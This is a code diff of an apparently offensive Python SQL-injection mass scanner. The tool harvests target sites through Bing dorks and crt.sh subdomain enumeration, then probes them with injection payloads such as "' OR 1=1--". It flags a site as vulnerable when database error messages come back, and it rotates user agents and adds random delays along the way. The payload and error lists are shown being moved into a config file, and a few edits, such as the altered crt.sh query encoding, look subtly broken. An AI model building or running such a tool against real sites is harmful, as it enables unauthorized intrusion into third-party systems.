@@ -7,28 +7,11 @@ import re
 from bs4 import BeautifulSoup
 from urllib.parse import unquote, urlparse, parse_qs
 from concurrent.futures import ThreadPoolExecutor
+import json
+
+from config import SQLI_ERRORS, USER_AGENTS, PAYLOADS
 
 requests.packages.urllib3.disable_warnings()
-
-SQLI_ERRORS = [
-    "you have an error in your sql syntax;",
-    "mysql_fetch_array()",
-    "warning: mysql",
-    "unclosed quotation mark after the character string",
-    "quoted string not properly terminated",
-    "mysql_num_rows()",
-    "supplied argument is not a valid MySQL result resource"
-]
-
-USER_AGENTS = [
-    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)...',
-    'Mozilla/5.0 (X11; Linux x86_64)...',
-    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)...',
-]
-
-PAYLOADS = [
-    "'", '"', "';", "' OR 1=1--", "' AND 1=2--", "') OR '1'='1", "')--"
-]
 
 def print_banner():
     print(r"""
@@ -38,13 +21,11 @@ def print_banner():
   ___) | |_| | |___|  _  | |_| | |_| | |\  | |_| |
  |____/ \__\_\_____|_| |_|\___/ \___/|_| \_|____/ 
                                                   
+
                      V 1.0
     """)
 
 def get_real_url(bing_link):
-    """
-    Extract real target URL from Bing redirect links if present.
-    """
     parsed = urlparse(bing_link)
     if parsed.netloc.endswith("bing.com"):
         qs = parse_qs(parsed.query)
@@ -53,9 +34,7 @@ def get_real_url(bing_link):
                 real_url = qs[key][0]
                 if real_url.startswith("http"):
                     return real_url
-        return None
-    else:
-        return bing_link
+    return bing_link
 
 def extract_links_from_dork(dork, limit, domain_filter=None):
     print(f"[+] Searching: {dork}")
@@ -75,20 +54,19 @@ def extract_links_from_dork(dork, limit, domain_filter=None):
                 continue
             if domain_filter:
                 netloc = urlparse(link).netloc.lower()
-                # filter subdomains by checking endswith
                 if not netloc.endswith(domain_filter.lower()):
                     continue
             links.append(link)
         unique_links = list(dict.fromkeys(links))
         print(f"[+] Found {len(unique_links)} links after filtering.")
         return unique_links[:limit]
-    except Exception as e:
+    except requests.exceptions.RequestException as e:
         print(f"[!] Error fetching links: {e}")
         return []
 
 def get_subdomains(domain):
     print(f"[+] Enumerating subdomains for: {domain}")
-    url = f"https://crt.sh/?q=%25.{domain}&output=json"
+    url = f"https://crt.sh/?q=%.{domain}&output=json"
     try:
         res = requests.get(url, timeout=10)
         data = res.json()
@@ -100,7 +78,7 @@ def get_subdomains(domain):
                     subdomains.add(sub.strip())
         print(f"[+] Found {len(subdomains)} subdomains.")
         return [f"http://{sub}" for sub in sorted(subdomains)] + [f"https://{sub}" for sub in sorted(subdomains)]
-    except Exception as e:
+    except requests.exceptions.RequestException as e:
         print(f"[!] Failed to enumerate subdomains: {e}")
         return []
 
@@ -114,7 +92,7 @@ def is_vulnerable(url):
                 print(f"[VULNERABLE] {url}")
                 return True
             time.sleep(random.uniform(0.5, 1.5))
-    except Exception:
+    except requests.exceptions.RequestException:
         pass
     print(f"[SAFE] {url}")
     return False
@@ -138,7 +116,6 @@ def main():
             all_urls.extend([line.strip() for line in f if line.strip()])
     elif args.dorks:
         for dork in args.dorks:
-            # pass domain filter if specified
             links = extract_links_from_dork(dork, args.limit, args.dorkdomain)
             all_urls.extend(links)
     elif args.domain:
@@ -160,7 +137,7 @@ def main():
 
     if args.output:
         with open(args.output, 'w') as f:
-            f.write("\n".join(vulnerable_urls))
+            json.dump(vulnerable_urls, f, indent=4)
         print(f"\n[+] Vulnerable URLs saved to {args.output}")
 
 if __name__ == '__main__':
